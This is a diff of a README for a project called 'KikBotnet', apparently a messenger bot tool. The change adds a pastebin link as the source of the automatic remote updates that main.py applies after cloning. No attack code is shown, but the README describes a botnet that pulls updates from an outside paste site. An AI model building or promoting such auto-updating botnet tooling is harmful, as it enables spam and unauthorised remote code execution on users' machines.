@@ -11,7 +11,7 @@ Make sure you are using Python 3.6+, not python 2.7!
 
 Use `git clone https://github.com/StethoSaysHello/KikBotnet`
 
-Then just run [main.py](https://github.com/StethoSaysHello/KikBotnet/blob/main/main.py), it will install all of the needed dependancies and modules for you. All updates to the botnet will be applied remotley, it's all automatic!
+Then just run [main.py](https://github.com/StethoSaysHello/KikBotnet/blob/main/main.py), it will install all of the needed dependancies and modules for you. All [updates](https://pastebin.com/cwFgz7dM) to the botnet will be applied remotley, it's automatic!
 
 # Usage
 
